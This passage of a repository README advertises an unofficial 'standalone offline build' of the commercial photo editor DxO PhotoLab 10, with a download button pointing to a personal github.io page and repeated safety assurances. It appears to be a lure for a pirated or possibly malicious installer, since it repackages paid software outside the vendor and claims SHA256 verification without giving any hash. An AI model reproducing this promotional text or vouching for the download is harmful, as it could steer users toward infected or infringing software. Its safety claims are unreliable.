<div align="center">

# 🎨 DxO PhotoLab 10 2026: Standalone Offline Build for Windows 11

<img src="https://img.shields.io/badge/platform-windows_10%2F11-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Platform"> <img src="https://img.shields.io/badge/release-v2026.1-24292F?style=for-the-badge" alt="Release"> <img src="https://img.shields.io/badge/updated-2026--11--14-6E7781?style=for-the-badge" alt="Updated"> <img src="https://img.shields.io/badge/status-stable-2EA043?style=for-the-badge" alt="Status"> <img src="https://img.shields.io/badge/languages-12%2B-8250DF?style=for-the-badge&logo=googletranslate&logoColor=white" alt="Languages">

</div>

## 📦 Intro

This repository publishes a standalone offline Windows x64 distribution package intended for the DxO PhotoLab 10 workflow, packaged for Windows 10 and 11. The build ships as a single self-contained offline setup with the runtime, libraries, and default asset set included, so no download components are fetched at runtime. It is maintained as an independent distribution package rather than a vendor release.

The deployment audience is administrators, lab technicians, and individual users who need reproducible installs on air-gapped workstations, bandwidth-constrained networks, or offline field machines. The build is designed so the same package can be retrieved once and deployed to many hosts without contacting a remote endpoint. This makes the standalone setup suitable for environments where every artifact must be accounted for.

The distribution covers a single DxO PhotoLab 10 on Windows deployment surface with both installed and portable modes, plus bundled presets and language resources. File associations, shell integration, and per-user configuration paths are all handled by the package itself.

## 01 · ⬇️ Download

<p align="center">
  <a href="https://ben-miller-23.github.io/dxo-photolab-10-desktop/">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="docs/buttons/installer-card-dark.svg">
      <img src="docs/buttons/installer-card.svg" alt="" width="440">
    </picture>
  </a>
</p>

<p align="center">
  <img src="docs/buttons/banner.png" alt="DxO PhotoLab 10 2026 standalone build running on Windows 11, interface banner" width="100%">
</p>

## 02 · ✨ Features

<table>
<tr>
<td width="33%" valign="top">

**📦 Self-Contained Package**

All runtime libraries and default assets ship inside the single offline setup file, no post-install fetch.

</td>
<td width="33%" valign="top">

**🗂️ Portable and Installed Modes**

The same distribution supports a per-user install path or a portable folder that runs from removable media.

</td>
<td width="33%" valign="top">

**🔐 SHA256 Verification**

A published hash is provided alongside every build so the retrieved artifact can be verified before deployment.

</td>
</tr>
<tr>
<td valign="top">

**🌐 Multilingual Resources**

Twelve or more language packs are bundled in the distribution and switchable at runtime without extra downloads.

</td>
<td valign="top">

**🧩 File Association Control**

Install-time handlers register or skip file associations for supported formats, with a clean opt-out path.

</td>
<td valign="top">

**🧾 Reproducible Deployments**

The installer layout is stable across versions, supporting scripted deployment and hash-pinned rollouts.

</td>
</tr>
</table>

## 03 · ⚙️ How it works

The distribution is a single packaged installer that expands into the program directory for the application plus a per-user configuration folder under the user profile. Runtime libraries and default presets are copied into the application directory at first install, so the package is self-sufficient after extraction. No bootstrap downloader runs during or after the install.

On first launch, the build registers its shell integration entries, writes the initial configuration into the user profile, and indexes the bundled preset and resource directories. Default paths can be overridden by editing the configuration file after install, and the initial run only writes inside the user profile and the chosen application directory. No files are placed in Windows system directories.

Day to day, the build operates fully offline: image processing, catalog access, and export all run locally without contacting a remote endpoint. Updates are applied by running a newer versioned installer over the existing installation, which preserves projects, presets, and preferences. There is no background updater service and no silent network calls.

The integration surface is limited to the shell (context menu entries, optional file associations), the Windows registry keys required for uninstall and for file type registration, and the user profile configuration directory. Coexistence with other installations of similar software is supported, and portable mode leaves no registry footprint unless the user opts in during first run.

## 04 · 🧩 Compatibility

The build targets Windows 10 and Windows 11 on x64, 